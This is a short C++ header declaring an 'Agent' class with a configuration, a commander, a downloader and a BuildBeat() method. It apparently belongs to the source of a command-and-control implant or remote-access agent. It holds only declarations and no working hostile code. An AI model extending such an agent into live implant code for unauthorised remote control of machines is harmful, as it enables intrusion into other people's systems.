#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "Commander.h"

class Commander;

class Agent
{
	AgentInfo* info;

public:
	bool active = true;

	AgentConfig* config;
	Commander*   commander;
	Downloader*  downloader;

	Agent();

	LPSTR BuildBeat();
};
